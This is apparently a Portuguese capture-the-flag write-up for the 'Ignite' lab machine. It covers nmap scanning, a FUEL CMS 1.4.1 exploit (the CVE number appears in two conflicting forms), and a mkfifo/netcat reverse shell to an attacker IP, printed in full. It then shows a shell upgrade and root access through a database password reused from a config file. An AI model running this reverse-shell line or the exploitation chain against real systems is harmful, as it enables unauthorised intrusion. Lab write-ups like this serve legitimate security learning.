Ignite:
Começamos adicionando o $ip no arquivo hosts

sudo echo "$ip" >> /etc/hosts

Começamos com um nmap para identificar serviços e softwares no servidor:

  nmap ignite.thm -sV
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS

Robots Content:
Disallow: /fuel/

Acessando o diretorio contido em robots.txt, ignite.thm/fuel, deparamos com um CMS de versão 1.4.1 com uma CVE-2019-16763
#FUEL CMS
#Version: <= 1.4.1
#CVE-2018-16763
#Tested on: Ubuntu - Apache2 - php5

Baixamos o exploit para esta CVE e conseguimos uma shell simples para o servidor, acessando como o usuario www-data

Usando FIFO, vamos criar um arquivo em /tmp/

O arquivo FIFO é criado vazio e atua como um canal de comunicação entre processos.
Um processo pode escrever dados no FIFO, enquanto outro processo pode lê-los
Assim, com o comando abaixo vamos criar uma shell mais completa para proseguir com o CTF

rm /tmp/shell;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.44.97 44444>/tmp/f

rm remove qualquer arquivo chamado shell em /tmp
mkfifo cria o arquivo fifo chamado f em /tmp
usamos o cat /tmp/f para fazer a leitura do arquivo fifo = f em /tmp/f
em seguida, jogamos a saida através do PIPE | para um nc reverso na máquina atacante.

"NA MÀQUINA ATTACANTE, EXEUTAMOS O COMANDO   #nc -nlvp 44444"
Assim, quando for executado o comando acima, vamos obter uma shell melhorada, em seguida


Verificamos se possui python usando
locate python3,
python3 -c 'import pty;pty.spawn("/bin/bash")'



Analisando arquivos de configurações do próprio sistema WEB Fuel CMS, achamos o seguinte arquivo.

" -rwxrwxrwx 1 root root 4646 Jul 26  2019 /var/www/html/fuel/application/config/database.php "

Listando as permissoes do arquivo, de propriedade do ROOT com permissao de escrita e leitura para todos usuarios do sistema.
Achamos um arquivo de configuração e aberto para leitura.

Searching passwords in config PHP files
/var/www/html/fuel/application/config/database.php:     'password' => '???????',


Isso nos remete a ideia de nao manter senhas iguais em varios lugares, ali se trata da senha do banco de dados, surpresa, ao tentar fazer login com o usuario root (su root)
a senha exatamente a mesma.

Conseguindo o ROOT e as flags

User
???????????????????????????????.flag
root
???????????????????????????????.flag
